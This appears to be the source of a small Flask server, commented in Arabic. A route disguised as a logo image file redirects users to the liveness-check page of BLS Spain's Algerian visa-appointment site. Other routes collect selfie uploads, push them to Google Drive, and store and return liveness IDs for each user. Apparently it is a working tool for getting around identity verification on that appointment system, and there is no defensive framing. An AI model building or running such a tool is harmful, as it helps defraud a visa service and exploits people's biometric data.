from flask import Flask, request, jsonify, send_from_directory, redirect
import os
import json
from drive_uploader import upload_to_drive

app = Flask(__name__, static_url_path='/static')

UPLOAD_FOLDER = 'selfies'
DB_FILE = 'db.json'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# ---------------------
# مسار التوجيه المزيف للكاميرا
# ---------------------
@app.route('/assets/images/logo.png')
def fake_logo_redirect():
    user_id = request.args.get('user_id')
    if not user_id:
        return "Missing user_id", 400

    # إعادة التوجيه إلى صفحة OzLiveness على blsspainglobal
    redirect_url = f"https://algeria.blsspainglobal.com/DZA/Appointment/Liveness?data={user_id}"
    return redirect(redirect_url, code=302)

# ---------------------
# الصفحة الرئيسية
# ---------------------
@app.route('/')
def index():
    return 'Flask server is running correctly at root!'

# ---------------------
# عرض صفحة السيلفي (إن كانت ضرورية)
# ---------------------
@app.route('/selfie.html')
def serve_selfie():
    return send_from_directory('.', 'selfie.html')

# ---------------------
# استلام بيانات السيلفي
# ---------------------
@app.route('/update_liveness', methods=['POST'])
def update_liveness():
    user_id = request.form.get('user_id', 'unknown_user')

    if 'selfie_file' in request.files:
        selfie_file = request.files['selfie_file']
        filename = f'{user_id}.jpg'
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        selfie_file.save(file_path)

        liveness_id = request.form.get('liveness_id', 'generated_' + user_id)
        save_liveness_id(user_id, liveness_id)

        upload_to_drive(file_path, filename)
    else:
        return jsonify({"status": "error", "message": "No selfie_file provided"})

    return jsonify({"status": "success", "message": "Selfie uploaded", "user_id": user_id})

# ---------------------
# جلب liveness_id حسب user_id
# ---------------------
@app.route('/retrieve_data', methods=['GET'])
def retrieve_data():
    user_id = request.args.get('user_id')
    if not user_id:
        return jsonify([])

    data = load_db()
    liveness_id = data.get(user_id)
    if not liveness_id:
        return jsonify([])

    return jsonify([{"user_id": user_id, "liveness_id": liveness_id}])

# ---------------------
# الدوال المساعدة
# ---------------------
def save_liveness_id(user_id, liveness_id):
    data = load_db()
    data[user_id] = liveness_id
    with open(DB_FILE, 'w') as f:
        json.dump(data, f)

def load_db():
    if not os.path.exists(DB_FILE):
        return {}
    with open(DB_FILE, 'r') as f:
        return json.load(f)

# ---------------------
# تشغيل السيرفر
# ---------------------
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
